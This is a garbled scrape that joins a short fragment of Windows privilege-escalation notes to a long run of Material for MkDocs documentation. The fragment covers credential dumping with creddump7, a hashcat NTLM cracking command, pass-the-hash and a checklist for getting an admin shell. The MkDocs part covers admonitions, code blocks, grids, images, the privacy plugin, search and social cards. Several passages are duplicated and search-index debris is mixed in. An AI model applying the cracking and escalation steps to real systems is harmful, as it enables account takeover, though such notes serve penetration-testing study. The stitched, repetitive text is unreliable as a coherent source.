\u2018[CredDump](https://github.com/Neohapsis/creddump7.git)\u2019 Use hashcat to crack hash C :\\ Cas > hashcat -m 1000 - -force < hash > / usr / share / wordlists / rockyou . txt Passing the Hash \u00b6 info Windows accepts hashes instead of passwords to authenticate to a number of services.

Spend some time and read over the results of your enumeration. If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work. Have a quick look around for files in your user\u2019s desktop and other common locations (e.g. C: and C:\\Program Files). Read through interesting files that you find, as they may contain useful information that could help escalate privileges. Try things that don\u2019t have many steps first, e.g. registry exploits, services, etc. Have a good look at admin processes, enumerate their versions and search for exploits. Check for internal ports that you might be able to forward to your attacking machine. If you still don\u2019t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd. This might be a process or file name you aren\u2019t familiar with or even a username. At this stage you can also start to think about Kernel Exploits.

Material for MkDocs provides several different types of admonitions and allows for the inclusion and nesting of arbitrary content. Configuration \u00b6 This configuration enables admonitions, allows to make them collapsible and to nest arbitrary content inside admonitions. Add the following lines to mkdocs.yml : markdown_extensions : - admonition - pymdownx.details - pymdownx.superfences See additional configuration options: Admonition Details SuperFences Admonition icons \u00b6 8.3.0 \u00b7 Experimental Each of the supported admonition types has a distinct icon, which can be changed to any icon bundled with the theme, or even a custom icon .

The content of the block follows on the next line, indented by four spaces: Admonition !!! note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Changing the title \u00b6 By default, the title will equal the type qualifier in titlecase. However, it can be changed by adding a quoted string containing valid Markdown (including links, formatting, ...) after the type qualifier: Admonition with custom title !!! note \"Phasellus posuere in sem ut cursus\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Removing the title \u00b6 Similar to changing the title , the icon and title can be omitted entirely by adding an empty string directly after the type qualifier. Note that this will not work for collapsible blocks : Admonition without title !!! note \"\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Collapsible blocks \u00b6 When Details is enabled and an admonition block is started with ??? instead of !!! , the admonition is rendered as a collapsible block with a small toggle on the right side: Admonition, collapsible ??? note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Adding a + after the ??? token renders the block expanded: Admonition, collapsible and initially expanded ???+ note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Inline blocks \u00b6 7.0.0 \u00b7 Experimental Admonitions can also be rendered as inline blocks (i.e. for sidebars), placing them to the right using the inline + end modifiers, or to the left using only the inline modifier: inline end inline Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. !!! info inline end Lorem ipsum dolor sit amet, consectetur adipiscing elit.

Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Use inline to align to the left (right for rtl languages). Important : admonitions that use the inline modifiers must be declared prior to the content block you want to place them beside. If there's insufficient space to render the admonition next to the block, the admonition will stretch to the full width of the viewport, e.g. on mobile viewports.

Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! With this trick, annotations can also be added to blockquotes, lists, and many other elements that are not supported by the Attribute Lists extension. Furthermore, note that code blocks follow different semantics . Known limitations Please note that annotations currently don't work in data tables as reported in #3453 , as data tables are scrollable elements and positioning is very tricky to get right.

Add the following lines to mkdocs.yml : markdown_extensions : - pymdownx.highlight : anchor_linenums : true - pymdownx.inlinehilite - pymdownx.snippets - pymdownx.superfences The following sections discuss how to use different syntax highlighting features with Pygments , the recommended highlighter, so they don't apply when using a JavaScript syntax highlighter. See additional configuration options: Highlight InlineHilite SuperFences Snippets Code annotations \u00b6 8.0.0 \u00b7 Feature flag Code annotations offer a comfortable and friendly way to attach arbitrary content to specific sections of code blocks by adding numeric markers in block and inline comments in the language of the code block. Add the following to mkdocs.yml to enable them globally: theme : features : - content.code.annotate # (1)! I'm a code annotation! I can contain code , formatted text , images, ... basically anything that can be written in Markdown. Enabling code annotations for a specific code block If you don't want to enable code annotations globally, because you don't like the automatic inlining behavior, you can enable them for a specific code block by using a slightly different syntax based on the Attribute Lists extension: ``` { .yaml .annotate } # Code block content ``` Note that the language shortcode which has to come first must now also be prefixed by a . . Anchor links \u00b6 Sponsors only \u00b7 insiders-4.4.0 \u00b7 Experimental In order to link to code annotations and share them more easily, Insiders adds an anchor link to each annotation automatically, which you can copy via right click or open in a new tab: # (1)! If you Cmd me, I'm rendered open in a new tab. You can also right-click me to copy link address to share me with others. Usage \u00b6 Code blocks must be enclosed with two separate lines containing three backticks. To add syntax highlighting to those blocks, add the language shortcode directly after the opening block. See the list of available lexers to find the shortcode for a given language: Code block ``` py import tensorflow as tf ``` import tensorflow as tf Adding a title \u00b6 7.3.6 In order to provide additional context, a custom title can be added to a code block by using the title=\"<custom title>\" option directly after the shortcode, e.g. to display the name of a file: Code block with title ``` py title=\"bubble_sort.py\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` bubble_sort.py def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Adding annotations \u00b6 Code annotations can be placed anywhere in a code block where a comment for the language of the block can be placed, e.g. for JavaScript in // ... and /* ... */ , for YAML in # ... , etc. 1 : Code block with annotation ``` yaml theme: features: - content.code.annotate # (1) ``` 1. :man_raising_hand: I'm a code annotation!

Stripping comments \u00b6 Sponsors only \u00b7 insiders-4.4.0 \u00b7 Experimental If you wish to strip the comment characters surrounding a code annotation, Insiders adds a new syntax that allows for just that. Simply add an ! after the closing parens of the code annotation: Code block with annotation, stripped ``` yaml # (1)! ``` 1. Look ma, less line noise! # (1)! Look ma, less line noise! Note that this only allows for a single code annotation to be rendered per comment. If you want to add multiple code annotations, comments cannot be stripped for technical reasons. Adding line numbers \u00b6 Line numbers can be added to a code block by using the linenums=\"<start>\" option directly after the shortcode, whereas <start> represents the starting line number. A code block can start from a line number other than 1 , which allows to split large code blocks for readability: Code block with line numbers ``` py linenums=\"1\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` 1 2 3 4 5 def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Highlighting specific lines \u00b6 Specific lines can be highlighted by passing the line numbers to the hl_lines argument placed right after the language shortcode.

Muuuuuuuuuuuuuuuch more space for content Annotations with numbers \u00b6 Prior to 8.1.0 , code annotations were rendered with markers showing the original number as used by the author. However, for technical reasons code annotation numbers restart each code block, which might lead to confusion. For this reason, code annotations now render as + signs which are rotated if they're open to denote that clicking them again will close them. If you wish to revert to the prior behavior and display code annotation numbers, you can add an additional style sheet and copy and paste the following CSS: docs/stylesheets/extra.css mkdocs.yml . md-typeset . md-annotation__index > :: before { content : attr ( data -md-annotation-id ); } . md-typeset : focus-within > . md-annotation__index > :: before { transform : none ; } extra_css : - stylesheets/extra.css Code annotations require syntax highlighting with Pygments \u2013 they're currently not compatible with JavaScript syntax highlighters, or languages that do not have comments in their grammar.

Grids are just perfect for building index pages that show a brief overview of a large section of your documentation. Configuration \u00b6 This configuration enables the use of grids, allowing to bring blocks of identical or different types into a rectangular shape. Add the following lines to mkdocs.yml : markdown_extensions : # (1)! - attr_list - md_in_html Note that some of the examples listed below use icons and emojis , which have to be configured separately . See additional configuration options: Attribute Lists Markdown in HTML Usage \u00b6 Grids come in two flavors: card grids , which wrap each element in a card that levitates on hover, and generic grids , which allow to arrange arbitrary block elements in a rectangular shape. Using card grids \u00b6 Sponsors only \u00b7 insiders-4.12.0 \u00b7 Experimental Card grids wrap each grid item with a beautiful hover card that levitates on hover. They come in two slightly different syntaxes: list and block syntax , adding support for distinct use cases. List syntax \u00b6 The list syntax is essentially a shortcut for card grids , and consists of an unordered (or ordered) list wrapped by a div with both, the grid and cards classes: Card grid < div class = \"grid cards\" markdown > - :fontawesome-brands-html5: __HTML__ for content and structure - :fontawesome-brands-js: __JavaScript__ for interactivity - :fontawesome-brands-css3: __CSS__ for text running out of boxes - :fontawesome-brands-internet-explorer: __Internet Explorer__ ... huh? </ div > HTML for content and structure JavaScript for interactivity CSS for text running out of boxes Internet Explorer ... huh? List elements can contain arbitrary Markdown, as long as the surrounding div defines the markdown attribute. Following is a more complex example, which includes icons and links: Card grid, complex example < div class = \"grid cards\" markdown > - :material-clock-fast:{ .lg .middle } __Set up in 5 minutes__ --- Install [`mkdocs-material`](#) with [`pip`](#) and get up and running in minutes [:octicons-arrow-right-24: Getting started](#) - :fontawesome-brands-markdown:{ .lg .middle } __It's just Markdown__ --- Focus on your content and generate a responsive and searchable static site [:octicons-arrow-right-24: Reference](#) - :material-format-font:{ .lg .middle } __Made to measure__ --- Change the colors, fonts, language, icons, logo and more with a few lines [:octicons-arrow-right-24: Customization](#) - :material-scale-balance:{ .lg .middle } __Open Source, MIT__ --- Material for MkDocs is licensed under MIT and available on [GitHub] [:octicons-arrow-right-24: License](#) </ div > Set up in 5 minutes Install mkdocs-material with pip and get up and running in minutes Getting started It's just Markdown Focus on your content and generate a responsive and searchable static site Reference Made to measure Change the colors, fonts, language, icons, logo and more with a few lines Customization Open Source, MIT Material for MkDocs is licensed under MIT and available on GitHub License If there's insufficient space to render grid items next to each other, the items will stretch to the full width of the viewport, e.g. on mobile viewports. If there's more space available, grids will render in items of 3 and more, e.g. when hiding both sidebars . Block syntax \u00b6 The block syntax allows for arranging cards in grids together with other elements , as explained in the section on generic grids . Just add the card class to any block element inside a grid : Card grid, blocks < div class = \"grid\" markdown > :fontawesome-brands-html5: __HTML__ for content and structure { .card } :fontawesome-brands-js: __JavaScript__ for interactivity { .card } :fontawesome-brands-css3: __CSS__ for text running out of boxes { .card } > :fontawesome-brands-internet-explorer: __Internet Explorer__ ... huh? </ div > HTML for content and structure JavaScript for interactivity CSS for text running out of boxes Internet Explorer ... huh?

Usage \u00b6 Image alignment \u00b6 When Attribute Lists is enabled, images can be aligned by adding the respective alignment directions via the align attribute, i.e. align=left or align=right : Left Right Image, aligned to left ![ Image title ]( https://dummyimage.com/600x400/eee/aaa ){ align=left } Lorem ipsum dolor sit amet, consectetur adipiscing elit.

If there's insufficient space to render the text next to the image, the image will stretch to the full width of the viewport, e.g. on mobile viewports. Why is there no centered alignment? The align attribute doesn't allow for centered alignment, which is why this option is not supported by Material for MkDocs. 1 Instead, the image captions syntax can be used, as captions are optional. Image captions \u00b6 Sadly, the Markdown syntax doesn't provide native support for image captions, but it's always possible to use the Markdown in HTML extension with literal figure and figcaption tags: Image with caption < figure markdown > ![Image title](https://dummyimage.com/600x400/){ width=\"300\" } < figcaption > Image caption </ figcaption > </ figure > Image caption Image lazy-loading \u00b6 Modern browsers provide native support for lazy-loading images through the loading=lazy directive, which degrades to eager-loading in browsers without support: Image, lazy-loaded ![ Image title ]( https://dummyimage.com/600x400/ ){ loading=lazy } Light and dark mode \u00b6 8.1.1 \u00b7 Experimental If you added a color palette toggle and want to show different images for light and dark color schemes, you can append a #only-light or #only-dark hash fragment to the image URL: Image, different for light and dark mode ![ Image title ]( https://dummyimage.com/600x400/f5f5f5/aaaaaa#only-light ) ![ Image title ]( https://dummyimage.com/600x400/21222c/d5d7e2#only-dark ) You might also realize that the align attribute has been deprecated as of HTML5, so why use it anyways? The main reason is portability \u2013 it's still supported by all browsers and clients, and is very unlikely to be completely removed, as many older websites still use it.

Add the following lines to mkdocs.yml : plugins : - privacy # (1)! Note that the privacy plugin should be located at the end of the list of plugins , as it will scan the resulting HTML for resources to download and replace. If a plugin after the privacy plugin adds further external assets , these assets will not be downloaded. If you need to be able to build your documentation with and without Insiders , please refer to the built-in plugins section to learn how shared configurations help to achieve this. The following configuration options are available: enabled Default: true \u2013 This option specifies whether the plugin is enabled when building your project. If you want to switch the plugin off, e.g. for local builds, use an environment variable : plugins : - privacy : enabled : !ENV [ PRIVACY , false ] externals Default: bundle \u2013 This option specifies what the plugin should do when encountering external assets. There are two options: while report will issue warning messages during the build, bundle will automatically download all external files and adjust all references: plugins : - privacy : externals : bundle If you've removed all external assets from your project via customization , it's still a good idea to enable the plugin and set the mode to report , as the plugin will make sure that there are no hidden external links in any Markdown files that were unintentionally added. Using report in strict mode will make the build fail when external assets are detected. externals_dir Default: assets/externals \u2013 This option specifies where the downloaded external assets will be stored. It's normally not necessary to change this option: plugins : - privacy : externals_dir : assets/externals externals_exclude Default: none \u2013 This option allows to exclude certain external assets from processing by the privacy plugin, so they will not be downloaded and bundled during the build: plugins : - privacy : externals_exclude : # (1)! - cdn.jsdelivr.net/npm/mathjax@3/* - giscus.app/* MathJax loads web fonts for typesetting of mathematical content through relative URLs, and thus cannot be automatically bundled by the privacy plugin. MathJax can be self-hosted . Giscus, which we recommend to use as a comment system , uses a technique called code-splitting to load only the code that is necessary, which is implemented via relative URLs. Giscus can be self-hosted as well. Excluding specific external assets can be necessary if they contain dynamically created or relative URLs, which can't be resolved by the privacy plugin due to technical limitations . Why can't Material for MkDocs bundle all assets by design? The primary reason why Material for MkDocs can't just bundle all of its own assets is the integration with Google Fonts , which offers over a thousand different fonts that can be used to render your documentation. Most of the fonts include several weights and are split up into different character sets to keep the download size small, so the browser only downloads what is really needed. For Roboto, our default regular font , this results in 42 *.woff2 files in total . If Material for MkDocs would bundle all font files, the download size would be in the hundreds of megabytes, slowing down automated builds. Furthermore, authors might add external assets like third-party scripts or style sheets that would need to be remembered to be defined as further local assets. This is the very reason the built-in privacy plugin exists \u2014 it automates the process of downloading all external assets manually to ensure compliance with GDPR. Note that there are some technical limitations . How it works \u00b6 The built-in privacy plugin scans the resulting HTML for links to external resources, including external scripts, style sheets, images and web fonts, and downloads them to bundle them with your documentation site. Every URL refering to an external resource, no matter if part of a template or Markdown file, is then replaced with the URL to the local copy. An example: < script src = \"https://example.com/script.js\" ></ script > The external script is downloaded, and the link is replaced with: < script src = \"assets/externals/example.com/script.js\" ></ script > Style sheets are scanned for external url(...) references, e.g. images and web fonts, which are then also downloaded and bundled with your documentation site.

You might want to: Ignore the .cache directory in your project, by adding it to .gitignore . When building your site for publishing, use a build cache to save the .cache directory in between builds. Taking the example from the publishing guide , add the following lines: name : ci on : push : branches : - master - main jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions/setup-python@v2 with : python-version : 3.x - uses : actions/cache@v2 with : key : ${{ github.ref }} path : .cache - run : pip install mkdocs-material - run : mkdocs gh-deploy --force Limitations \u00b6 Note that dynamically created URLs as part of scripts are not detected, and thus cannot be automatically downloaded.

Add the following lines to mkdocs.yml : plugins : - privacy # (1)! Note that the privacy plugin should be located at the end of the list of plugins , as it will scan the resulting HTML for resources to download and replace. If a plugin after the privacy plugin adds further external assets , these assets will not be downloaded. If you need to be able to build your documentation with and without Insiders , please refer to the built-in plugins section to learn how shared configurations help to achieve this. The following configuration options are available: enabled Default: true \u2013 This option specifies whether the plugin is enabled when building your project. If you want to switch the plugin off, e.g. for local builds, use an environment variable : plugins : - privacy : enabled : !ENV [ PRIVACY , false ] externals Default: bundle \u2013 This option specifies what the plugin should do when encountering external assets. There are two options: while report will issue warning messages during the build, bundle will automatically download all external files and adjust all references: plugins : - privacy : externals : bundle If you've removed all external assets from your project via customization , it's still a good idea to enable the plugin and set the mode to report , as the plugin will make sure that there are no hidden external links in any Markdown files that were unintentionally added. Using report in strict mode will make the build fail when external assets are detected. externals_dir Default: assets/externals \u2013 This option specifies where the downloaded external assets will be stored. It's normally not necessary to change this option: plugins : - privacy : externals_dir : assets/externals externals_exclude Default: none \u2013 This option allows to exclude certain external assets from processing by the privacy plugin, so they will not be downloaded and bundled during the build: plugins : - privacy : externals_exclude : # (1)! - cdn.jsdelivr.net/npm/mathjax@3/* - giscus.app/* MathJax loads web fonts for typesetting of mathematical content through relative URLs, and thus cannot be automatically bundled by the privacy plugin. MathJax can be self-hosted . Giscus, which we recommend to use as a comment system , uses a technique called code-splitting to load only the code that is necessary, which is implemented via relative URLs. Giscus can be self-hosted as well. Excluding specific external assets can be necessary if they contain dynamically created or relative URLs, which can't be resolved by the privacy plugin due to technical limitations . Why can't Material for MkDocs bundle all assets by design? The primary reason why Material for MkDocs can't just bundle all of its own assets is the integration with Google Fonts , which offers over a thousand different fonts that can be used to render your documentation. Most of the fonts include several weights and are split up into different character sets to keep the download size small, so the browser only downloads what is really needed. For Roboto, our default regular font , this results in 42 *.woff2 files in total . If Material for MkDocs would bundle all font files, the download size would be in the hundreds of megabytes, slowing down automated builds. Furthermore, authors might add external assets like third-party scripts or style sheets that would need to be remembered to be defined as further local assets. This is the very reason the built-in privacy plugin exists \u2014 it automates the process of downloading all external assets manually to ensure compliance with GDPR.

This can easily be achieved with an additional style sheet and a few lines of CSS: docs/stylesheets/extra.css mkdocs.yml . md-grid { max-width : 1440 px ; /* (1)! */ } If you want the content area to always stretch to the available screen space, reset max-width with the following CSS: . md-grid { max-width : initial ; } extra_css : - stylesheets/extra.css Prior to 6.2.0, navigation tabs had a slightly different behavior.

This is where Material for MkDocs deviates from other themes. The following section explains how search can be customized to tailor it to your needs. Query transformation \u00b6 When a user enters a query into the search box, the query is pre-processed before it is submitted to the search index. Material for MkDocs will apply the following transformations, which can be customized by extending the theme : export function defaultTransform ( query : string ) : string { return query . split ( /\"([^\"]+)\"/g ) /* (1)! */ . map (( terms , index ) => index & 1 ? terms . replace ( /^\\b|^(?![^\\x00-\\x7F]|$)|\\s+/g , \" +\" ) : terms ) . join ( \"\" ) . replace ( /\"|(?:^|\\s+)[*+\\-:^~]+(?=\\s+|$)/g , \"\" ) /* (2)! */ . trim () /* (3)! */ } Search for terms in quotation marks and prepend a + modifier to denote that the resulting document must contain all terms, converting the query to an AND query (as opposed to the default OR behavior). While users may expect terms enclosed in quotation marks to map to span queries, i.e. for which order is important, lunr doesn't support them, so the best we can do is to convert the terms to an AND query. Replace control characters which are not located at the beginning of the query or preceded by white space, or are not followed by a non-whitespace character or are at the end of the query string. Furthermore, filter unmatched quotation marks. Trim excess whitespace from left and right. If you want to switch to the default behavior of the mkdocs and readthedocs themes, both of which don't transform the query prior to submission, or customize the transform function, you can do this by overriding the config block : {% extends \"base.html\" %} {% block config %} {{ super() }} < script > var __search = { transform : function ( query ) { return query } } </ script > {% endblock %} The transform function will receive the query string as entered by the user and must return the processed query string to be submitted to the search index. Custom search \u00b6 Material for MkDocs implements search as part of a web worker . If you want to switch the web worker with your own implementation, e.g. to submit search to an external service, you can add a custom JavaScript file to the docs directory and override the config block : {% extends \"base.html\" %} {% block config %} {{ super() }} < script > var __search = { worker : \"<url>\" } </ script > {% endblock %} Communication with the search worker is implemented using a designated message format using discriminated unions, i.e. through the type property of the message. See the following interface definitions to learn about the message formats: SearchMessage SearchIndex and SearchResult The sequence and direction of messages is rather intuitive: SearchSetupMessage SearchReadyMessage SearchQueryMessage SearchResultMessage","title":"Setting up site search"},{"location":"setup/setting-up-site-search/#setting-up-site-search","text":"Material for MkDocs provides an excellent client-side search implementation, omitting the need for the integration of third-party services, which might not be compliant with privacy regulations.

While users may expect terms enclosed in quotation marks to map to span queries, i.e. for which order is important, lunr doesn't support them, so the best we can do is to convert the terms to an AND query. Replace control characters which are not located at the beginning of the query or preceded by white space, or are not followed by a non-whitespace character or are at the end of the query string. Furthermore, filter unmatched quotation marks. Trim excess whitespace from left and right. If you want to switch to the default behavior of the mkdocs and readthedocs themes, both of which don't transform the query prior to submission, or customize the transform function, you can do this by overriding the config block : {% extends \"base.html\" %} {% block config %} {{ super() }} < script > var __search = { transform : function ( query ) { return query } } </ script > {% endblock %} The transform function will receive the query string as entered by the user and must return the processed query string to be submitted to the search index.","title":"Query transformation"},{"location":"setup/setting-up-site-search/#custom-search","text":"Material for MkDocs implements search as part of a web worker .

If you don't want to use Docker, see the following section which explains how to install all dependencies on your system: macOS Windows Linux Make sure Homebrew is installed, which is a modern package manager for macOS. Next, use the following command to install all necessary dependencies: brew install cairo freetype libffi libjpeg libpng zlib As stated in the installation guide , the easiest way to get up and running with the Cairo Graphics library on Windows is by installing GTK+ , since it has Cairo as a dependency. There are several package managers for Linux with varying availability per distribution. The installation guide explains how to install the Cairo Graphics library for your distribution: Ubuntu Fedora openSUSE apt-get install libcairo2-dev libfreetype6-dev libffi-dev libjpeg-dev libpng-dev libz-dev yum install cairo-devel freetype-devel libffi-devel libjpeg-devel libpng-devel zlib-devel zypper install cairo-devel freetype-devel libffi-devel libjpeg-devel libpng-devel zlib-devel Caching recommended \u00b6 The built-in social plugin automatically fetches the fonts you define in mkdocs.yml from Google Fonts, and uses them to render the text that is displayed on the social card. The font files and generated cards are both written to the .cache directory, which is used in subsequent builds to detect whether the social cards need to be regenerated. You might want to: Ignore the .cache directory in your project, by adding it to .gitignore . When building your site for publishing, use a build cache to save the .cache directory in between builds. Taking the example from the publishing guide , add the following lines: name : ci on : push : branches : - master - main jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions/setup-python@v2 with : python-version : 3.x - uses : actions/cache@v2 with : key : ${{ github.ref }} path : .cache - run : pip install mkdocs-material - run : mkdocs gh-deploy --force Meta tags \u00b6 The built-in social plugin automatically sets all necessary meta tags, equivalent to the following two customizations, which you can set manually when you don't want to use it: Open Graph Twitter Cards {% extends \"base.html\" %} {% block extrahead %} {% set title = config.site_name %} {% if page and page.meta and page.meta.title %} {% set title = title ~ \" - \" ~ page.meta.title %} {% elif page and page.title and not page.is_homepage %} {% set title = title ~ \" - \" ~ page.title %} {% endif %} < meta property = \"og:type\" content = \"website\" /> < meta property = \"og:title\" content = \"{{ title }}\" /> < meta property = \"og:description\" content = \"{{ config.site_description }}\" /> < meta property = \"og:url\" content = \"{{ page.canonical_url }}\" /> < meta property = \"og:image\" content = \"<url>\" /> < meta property = \"og:image:type\" content = \"image/png\" /> < meta property = \"og:image:width\" content = \"1200\" /> < meta property = \"og:image:height\" content = \"630\" /> {% endblock %} {% extends \"base.html\" %} {% block extrahead %} {% set title = config.site_name %} {% if page and page.meta and page.meta.title %} {% set title = title ~ \" - \" ~ page.meta.title %} {% elif page and page.title and not page.is_homepage %} {% set title = title ~ \" - \" ~ page.title %} {% endif %} < meta name = \"twitter:card\" content = \"summary_large_image\" /> < meta name = \"twitter:title\" content = \"{{ title }}\" /> < meta name = \"twitter:description\" content = \"{{ config.site_description }}\" /> < meta name = \"twitter:image\" content = \"<url>\" /> {% endblock %} Usage \u00b6 If you want to adjust the title or set a custom description for the social card, you can set the front matter title and description properties, which take precedence over the default values.

Enable it via mkdocs.yml : markdown_extensions : - pymdownx.highlight : anchor_linenums : true - pymdownx.superfences # (1)! Highlight is used by the SuperFences extension to perform syntax highlighting on code blocks, not the other way round, which is why this extension also needs to be enabled. The following configuration options are supported: use_pygments Default: true \u2013 This option allows to control whether highlighting should be carried out during build time using Pygments or in the browser with a JavaScript syntax highlighter: Pygments JavaScript markdown_extensions : - pymdownx.highlight : use_pygments : true - pymdownx.superfences markdown_extensions : - pymdownx.highlight : use_pygments : false As an example, Highlight.js , a JavaScript syntax highlighter, can be integrated with some additional JavaScript and an additional style sheet in mkdocs.yml : docs/javascripts/highlight.js mkdocs.yml document $ . subscribe (() => { hljs . highlightAll () }) extra_javascript : - https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js - javascripts/highlight.js extra_css : - https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/default.min.css Note that Highlight.js has no affiliation with the Highlight extension. All following configuration options are only compatible with build-time syntax highlighting using Pygments , so they don't apply if use_pygments is set to false . auto_title Default: false \u2013 This option will automatically add a title to all code blocks that shows the name of the language being used, e.g. Python is printed for a py block: markdown_extensions : - pymdownx.highlight : auto_title : true linenums Default: false \u2013 This option will add line numbers to all code blocks. If you wish to add line numbers to some , but not all code blocks, consult the section on adding line numbers in the code block reference, which also contains some tips on working with line numbers: markdown_extensions : - pymdownx.highlight : linenums : true linenums_style Default: table \u2013 The Highlight extension provides three ways to add line numbers, two of which are supported by Material for MkDocs. While table wraps a code block in a <table> element, pymdownx-inline renders line numbers as part of the line itself: markdown_extensions : - pymdownx.highlight : linenums_style : pymdownx-inline Note that inline will put line numbers next to the actual code, which means that they will be included when selecting text with the cursor or copying a code block to the clipboard. Thus, the usage of either table or pymdownx-inline is recommended. anchor_linenums 8.1.0 \u00b7 Default: false \u2013 If a code blocks contains line numbers, enabling this setting will wrap them with anchor links, so they can be hyperlinked and shared more easily: markdown_extensions : - pymdownx.highlight : anchor_linenums : true The other configuration options of this extension are not officially supported by Material for MkDocs, which is why they may yield unexpected results. Use them at your own risk. See reference for usage: Using code blocks Adding a title Adding line numbers Highlighting specific lines Custom syntax theme InlineHilite \u00b6 5.0.0 \u00b7 Extension The InlineHilite extension add support for syntax highlighting of inline code blocks.

Enable it via mkdocs.yml : markdown_extensions : - pymdownx.highlight - pymdownx.inlinehilite The configuration options of this extension are not specific to Material for MkDocs, as they only impact the Markdown parsing stage. The only exception is the css_class option, which must not be changed. See the InlineHilite documentation for guidance. See reference for usage: Highlighting inline code blocks Keys \u00b6 1.0.0 \u00b7 Extension The Keys extension adds a simple syntax to allow for the rendering of keyboard keys and combinations, e.g. Ctrl + Alt + Del .
